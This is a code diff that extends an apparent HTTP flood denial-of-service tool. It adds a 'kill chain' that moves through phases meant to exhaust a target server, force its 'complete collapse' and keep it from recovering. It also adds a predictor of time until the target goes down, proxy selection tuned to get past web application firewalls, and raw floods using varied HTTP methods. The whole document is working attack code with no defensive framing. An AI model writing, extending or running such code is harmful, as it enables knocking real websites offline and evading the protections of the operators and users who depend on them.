@@ -2619,6 +2619,16 @@ class HttpFlood(Thread):
         "multi_path_queue": [],    # Queue of (path, method) pairs for multi-targeting
         "encoding_rotation": 0,    # Payload encoding variant counter
         "path_scores": {},         # path -> success_rate for path targeting
+        "kill_chain_phase": "RECON",  # RECON->PROBE->WEAKEN->BREACH->OVERWHELM->SUSTAIN_KILL
+        "kill_chain_objective": "",    # Current phase objective description
+        "predicted_ttd": None,        # Time-To-Down prediction in seconds
+        "latency_trend_slope": 0,     # Positive = target weakening, Negative = recovering
+        "recovery_detected": False,   # True when target starts recovering
+        "recovery_counter": 0,        # How many times target recovered
+        "proxy_method_affinity": {},  # proxy_addr -> {method: success_rate}
+        "best_proxy_for_method": {},  # method -> [top proxy addrs]
+        "http_methods_pool": ["GET", "POST", "HEAD", "OPTIONS", "PATCH"],
+        "method_diversity_score": 0,  # How many unique methods used recently
     }
     
     # ========================================================================
@@ -2887,6 +2897,167 @@ class HttpFlood(Thread):
     def _chaos_get_browser_profile(self):
         """Select a random complete browser profile for header consistency."""
         return dict(randchoice(self._BROWSER_PROFILES))
+    
+    def _chaos_kill_chain(self):
+        """Structured Kill Chain Protocol with specific objectives per phase.
+        Unlike random phase transitions, this follows a deliberate attack doctrine."""
+        intel = self._chaos_intel
+        tick = intel["total_executions"]
+        phase = intel.get("kill_chain_phase", "RECON")
+        
+        # Phase transitions based on observable conditions, not just tick count
+        if phase == "RECON" and intel.get("recon_done"):
+            intel["kill_chain_phase"] = "PROBE"
+            intel["kill_chain_objective"] = "Test all methods, discover rate limits and weakpoints"
+            
+        elif phase == "PROBE" and tick > 50:
+            intel["kill_chain_phase"] = "WEAKEN"
+            intel["kill_chain_objective"] = "Exhaust connection pool and consume server memory"
+            
+        elif phase == "WEAKEN":
+            # Advance to BREACH when target shows signs of struggle
+            if intel.get("target_getting_weaker") or (intel.get("health_history") and len(intel["health_history"]) > 3 and intel["health_history"][-1] > intel.get("response_time_ms", 500) * 1.8):
+                intel["kill_chain_phase"] = "BREACH"
+                intel["kill_chain_objective"] = "Exploit weakpoint with maximum concentrated force"
+                
+        elif phase == "BREACH":
+            # Advance to OVERWHELM when we see 5xx or target_is_down
+            if intel.get("consecutive_5xx", 0) >= 2 or intel.get("target_is_down"):
+                intel["kill_chain_phase"] = "OVERWHELM"
+                intel["kill_chain_objective"] = "Full spectrum attack to ensure complete collapse"
+                
+        elif phase == "OVERWHELM":
+            # Advance to SUSTAIN_KILL after confirmed down
+            if intel.get("target_is_down"):
+                intel["kill_chain_phase"] = "SUSTAIN_KILL"
+                intel["kill_chain_objective"] = "Maintain minimum pressure to prevent target recovery"
+                
+        elif phase == "SUSTAIN_KILL":
+            # If target recovers, go back to BREACH
+            if intel.get("recovery_detected"):
+                intel["kill_chain_phase"] = "BREACH"
+                intel["kill_chain_objective"] = "Target recovering! Re-engaging with concentrated force"
+                intel["recovery_counter"] += 1
+                
+        return intel["kill_chain_phase"]
+    
+    def _chaos_predict_ttd(self):
+        """Predict Time-To-Down: estimate when the target will collapse based on latency trends.
+        Uses linear regression on health_history to extrapolate when response_time hits infinity."""
+        intel = self._chaos_intel
+        hp = intel.get("health_history", [])
+        
+        if len(hp) < 5:
+            return None
+            
+        # Calculate slope of latency trend (simple linear regression)
+        n = len(hp)
+        x_vals = list(range(n))
+        x_mean = sum(x_vals) / n
+        y_mean = sum(hp) / n
+        
+        numerator = sum((x - x_mean) * (y - y_mean) for x, y in zip(x_vals, hp))
+        denominator = sum((x - x_mean) ** 2 for x in x_vals)
+        
+        if denominator == 0:
+            return None
+            
+        slope = numerator / denominator
+        intel["latency_trend_slope"] = slope
+        
+        # Detect recovery: slope is negative (latency dropping = target recovering)
+        if slope < -50 and len(hp) > 5:
+            intel["recovery_detected"] = True
+        else:
+            intel["recovery_detected"] = False
+        
+        # Predict when latency reaches "critical" (10000ms = effectively down)
+        if slope > 0:
+            current_latency = hp[-1]
+            critical_latency = 10000
+            remaining_ms = critical_latency - current_latency
+            
+            if remaining_ms > 0 and slope > 0:
+                # Each health check is ~30 seconds apart
+                checks_to_down = remaining_ms / slope
+                seconds_to_down = int(checks_to_down * 30)
+                intel["predicted_ttd"] = max(seconds_to_down, 0)
+                return seconds_to_down
+                
+        intel["predicted_ttd"] = None
+        return None
+    
+    def _chaos_track_proxy_affinity(self, method_name, proxy_addr, success):
+        """Track which proxies work best with which attack methods.
+        Some proxies may be on cleaner IP ranges that certain WAFs trust more."""
+        intel = self._chaos_intel
+        if not proxy_addr:
+            return
+            
+        key = str(proxy_addr)
+        if key not in intel["proxy_method_affinity"]:
+            intel["proxy_method_affinity"][key] = {}
+        if method_name not in intel["proxy_method_affinity"][key]:
+            intel["proxy_method_affinity"][key][method_name] = {"s": 0, "t": 0}
+            
+        intel["proxy_method_affinity"][key][method_name]["t"] += 1
+        if success:
+            intel["proxy_method_affinity"][key][method_name]["s"] += 1
+            
+        # Update best proxy for method (every 50 attempts)
+        if intel["proxy_method_affinity"][key][method_name]["t"] % 50 == 0:
+            self._chaos_compute_best_proxies(method_name)
+    
+    def _chaos_compute_best_proxies(self, method_name):
+        """Find the top 3 proxies for a given method."""
+        intel = self._chaos_intel
+        proxy_scores = []
+        
+        for proxy_key, methods in intel["proxy_method_affinity"].items():
+            if method_name in methods:
+                data = methods[method_name]
+                if data["t"] >= 10:  # Need at least 10 attempts
+                    rate = data["s"] / data["t"]
+                    proxy_scores.append((proxy_key, rate))
+                    
+        proxy_scores.sort(key=lambda x: -x[1])
+        intel["best_proxy_for_method"][method_name] = [p[0] for p in proxy_scores[:3]]
+    
+    def _chaos_http_method_expand(self):
+        """Generate HTTP requests using HEAD, OPTIONS, PATCH to diversify attack surface.
+        Each HTTP method consumes server resources differently."""
+        try:
+            s = self.open_connection()
+            profile = self._chaos_get_browser_profile()
+            path = self.get_random_target_path()
+            if not path.startswith("/"):
+                path = "/" + path
+            
+            # Pick a non-standard HTTP method
+            http_method = randchoice(["HEAD", "OPTIONS", "PATCH", "PUT", "DELETE"])
+            referer = self._chaos_get_smart_referer()
+            
+            payload = (f"{http_method} {path} HTTP/1.1\r\n"
+                       f"Host: {self._target.authority}\r\n"
+                       f"User-Agent: {profile.get('User-Agent', randchoice(self._useragents))}\r\n"
+                       f"Accept: {profile.get('Accept', '*/*')}\r\n"
+                       f"Referer: {referer}\r\n"
+                       f"Connection: keep-alive\r\n")
+            
+            # Add body for PATCH/PUT
+            if http_method in ("PATCH", "PUT"):
+                body = self._generate_post_payload()
+                payload += f"Content-Type: application/json\r\n"
+                payload += f"Content-Length: {len(body)}\r\n"
+                payload += f"\r\n{body}"
+            else:
+                payload += f"\r\n"
+                
+            Tools.send(s, payload.encode("utf-8"))
+            REQUESTS_SENT.increment()
+            Tools.safe_close(s)
+        except Exception:
+            pass
     
     def _chaos_evolve_weights(self):
         """Genetic Algorithm: Evolve optimal weight configurations across generations.
@@ -3974,6 +4145,47 @@ class HttpFlood(Thread):
             if phase == "ASSAULT":
                 intel["exploration_bonus"] = False
         
+        # === STRATEGY X: Kill Chain Phase Strategy ===
+        kc_phase = intel.get("kill_chain_phase", "PROBE")
+        
+        if kc_phase == "WEAKEN":
+            # Objective: exhaust connections. Prioritize Slowloris + many connections
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 45)
+            weights["GET"] = max(weights.get("GET", 0), 20)
+            weights["COOKIE"] = max(weights.get("COOKIE", 0), 20)
+            
+        elif kc_phase == "BREACH":
+            # Objective: concentrated force on weakpoint
+            wp = intel.get("target_weakpoint")
+            if wp and wp in weights:
+                weights[wp] = int(weights[wp] * 2.5)
+            # Also boost heavy methods
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 45)
+            weights["STRESS"] = max(weights.get("STRESS", 0), 30)
+            
+        elif kc_phase == "OVERWHELM":
+            # Objective: everything at maximum
+            for m in weights:
+                if weights[m] > 5:
+                    weights[m] = int(weights[m] * 1.8)
+                    
+        elif kc_phase == "SUSTAIN_KILL":
+            # Objective: minimum effort to keep target down
+            for m in weights:
+                weights[m] = max(weights[m] // 2, 1)
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 40)
+            weights["GET"] = max(weights.get("GET", 0), 15)
+        
+        # === STRATEGY Y: Recovery Counter-Strike ===
+        if intel.get("recovery_detected") and intel.get("recovery_counter", 0) > 0:
+            # Target has recovered before. Hit harder this time
+            multiplier = 1.0 + (intel["recovery_counter"] * 0.3)
+            wp = intel.get("target_weakpoint")
+            if wp and wp in weights:
+                weights[wp] = int(weights[wp] * multiplier)
+            weights["STRESS"] = max(int(weights.get("STRESS", 0) * multiplier), 20)
+            weights["POST_DYN"] = max(int(weights.get("POST_DYN", 0) * multiplier), 25)
+        
         # === STRATEGY V: Genetic DNA Override ===
         # If we have evolved DNA from the genetic algorithm, blend it in
         dna = intel.get("current_dna")
@@ -4008,7 +4220,7 @@ class HttpFlood(Thread):
         return weights
         
     def _chaos_learn(self, method_name, success, got_5xx=False):
-        """Phase 5: Reinforcement Learning with sliding window memory."""
+        """Phase 5: Reinforcement Learning with sliding window memory + proxy affinity."""
         intel = self._chaos_intel
         
         # Sliding window: keep last 50 results per method
@@ -4017,6 +4229,10 @@ class HttpFlood(Thread):
         intel["success_history"][method_name].append(1 if success else 0)
         if len(intel["success_history"][method_name]) > 50:
             intel["success_history"][method_name] = intel["success_history"][method_name][-50:]
+        
+        # Track proxy-method affinity
+        if hasattr(self, '_current_proxy_addr'):
+            self._chaos_track_proxy_affinity(method_name, self._current_proxy_addr, success)
         
         # Track consecutive blocks for emergency mode
         if not success:
@@ -4062,8 +4278,19 @@ class HttpFlood(Thread):
         if intel["total_executions"] % 10 == 0:
             self._chaos_adaptive_rate()
         
-        # Phase 1.7: GENETIC EVOLUTION (every 100 executions)
+        # Phase 1.7: KILL CHAIN PROTOCOL
+        kc_phase = self._chaos_kill_chain()
+        
+        # Phase 1.8: PREDICTIVE MODELING (every 30s via health pulse)
+        if intel["total_executions"] % 30 == 0:
+            ttd = self._chaos_predict_ttd()
+        
+        # Phase 1.9: GENETIC EVOLUTION (every 100 executions)
         self._chaos_evolve_weights()
+        
+        # Phase 1.10: HTTP METHOD DIVERSIFICATION (2% of the time)
+        if randint(1, 50) == 1:
+            self._chaos_http_method_expand()
         
         # Phase 1.8: RATE LIMIT PROBING (exec 50 only)
         self._chaos_probe_rate_limit()
@@ -4240,7 +4467,26 @@ class HttpFlood(Thread):
                 print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                 print(f"{bcolors.OKCYAN}  [CHAOS V14 BATTLEGROUND STATUS]{bcolors.RESET}")
                 print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
+                kc = intel.get("kill_chain_phase", "?")
+                kc_colors = {"RECON": bcolors.OKCYAN, "PROBE": bcolors.OKBLUE, "WEAKEN": bcolors.WARNING, 
+                             "BREACH": bcolors.FAIL, "OVERWHELM": f"{bcolors.FAIL}{bcolors.BOLD}", "SUSTAIN_KILL": bcolors.OKGREEN}
+                kc_color = kc_colors.get(kc, bcolors.RESET)
+                print(f"  Kill Chain  : {kc_color}{kc}{bcolors.RESET} | Obj: {intel.get('kill_chain_objective', '...')[:50]}")
                 print(f"  Phase       : {bcolors.BOLD}{intel['phase']}{bcolors.RESET} | Executed: {intel['total_executions']} | Time: {elapsed}s")
+                # TTD Prediction
+                ttd = intel.get("predicted_ttd")
+                if ttd is not None:
+                    if ttd < 60:
+                        print(f"  Predicted   : {bcolors.OKGREEN}TARGET DOWN IN ~{ttd}s{bcolors.RESET}")
+                    elif ttd < 300:
+                        print(f"  Predicted   : {bcolors.WARNING}~{ttd//60}m {ttd%60}s to collapse{bcolors.RESET}")
+                    else:
+                        print(f"  Predicted   : {bcolors.FAIL}~{ttd//60}m to collapse (resilient target){bcolors.RESET}")
+                slope = intel.get("latency_trend_slope", 0)
+                if slope < -50:
+                    print(f"  Recovery    : {bcolors.FAIL}TARGET RECOVERING! (slope: {int(slope)}){bcolors.RESET}")
+                elif slope > 100:
+                    print(f"  Trend       : {bcolors.OKGREEN}Latency rising fast (slope: +{int(slope)}){bcolors.RESET}")
                 print(f"  Target HP   : {health_indicator}")
                 print(f"  WAF Status  : {waf_status}")
                 print(f"  Best Method : {bcolors.OKGREEN}{intel.get('best_method', 'Calibrating...')}{bcolors.RESET}")
